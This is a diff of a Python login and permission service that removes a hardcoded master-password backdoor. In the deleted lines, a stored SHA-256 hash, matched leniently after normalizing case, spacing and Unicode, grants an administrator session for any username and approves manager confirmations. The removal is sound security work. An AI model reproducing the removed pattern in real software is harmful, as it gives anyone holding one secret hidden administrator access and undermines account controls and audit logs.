@@ -4,8 +4,6 @@ import hashlib
 import hmac
 import json
 import os
-import re
-import unicodedata
 from dataclasses import dataclass
 from datetime import datetime, timedelta
 from typing import Any, Callable
@@ -47,7 +45,6 @@ class SecurityService:
     LOGIN_THROTTLE_KEY = "security_login_throttle_v1"
     MAX_LOGIN_FAILURES = 5
     LOGIN_COOLDOWN_SECONDS = 60
-    MASTER_PASSWORD_SHA256 = "f89df8c2689cb179a06efafecef653e12f99b525d12dbeb1ed3ff0484faebc57"
 
     def __init__(self, connection_factory: Callable[[], Any], *, inactivity_minutes: int = 15) -> None:
         self.connection_factory = connection_factory
@@ -201,34 +198,12 @@ class SecurityService:
     def set_user_active(self, username: str, active: bool) -> None:
         self.update_user(username, active=active)
 
-    @staticmethod
-    def _normalize_master_password(password: str) -> str:
-        # Aceita diferenças acidentais de maiúsculas, espaços duplicados e
-        # caracteres Unicode equivalentes, sem guardar a senha em texto puro.
-        value = unicodedata.normalize("NFKC", str(password or ""))
-        value = re.sub(r"\s+", " ", value).strip().casefold()
-        return value
-
-    @classmethod
-    def verify_master_password(cls, password: str) -> bool:
-        normalized = cls._normalize_master_password(password)
-        actual = hashlib.sha256(normalized.encode("utf-8")).hexdigest()
-        return hmac.compare_digest(actual, cls.MASTER_PASSWORD_SHA256)
-
     def authenticate(self, username: str, password: str) -> SecuritySession | None:
         username = self._normalize_username(username)
         if self._login_is_blocked(username):
             self._log_login(username, False, "LOGIN_BLOQUEADO")
             return None
         state = self._load()
-        if self.verify_master_password(password):
-            data = state["users"].get("admin") or next((item for item in state["users"].values() if item.get("active") and item.get("profile") == "ADMIN"), None)
-            if data:
-                user = SecurityUser("admin", data.get("display_name") or "Administrador", "ADMIN", True)
-                now = datetime.now(); self.session = SecuritySession(user, now, now)
-                self._log_login("admin", True, "LOGIN_MESTRE")
-                self._record_login_attempt(username, True)
-                return self.session
         data = state["users"].get(username)
         success = bool(data and data.get("active") and self.verify_password(password, data.get("password", {})))
         self._log_login(username, success, "LOGIN")
@@ -341,9 +316,6 @@ class SecurityService:
         return "*" in actions or str(action) in actions
 
     def confirm_manager_password(self, password: str) -> bool:
-        if self.verify_master_password(password):
-            self._log_login("admin", True, "CONFIRMACAO_MESTRE")
-            return True
         state = self._load()
         for username, data in state["users"].items():
             if data.get("active") and data.get("profile") in {"ADMIN", "GERENTE"} and self.verify_password(password, data.get("password", {})):
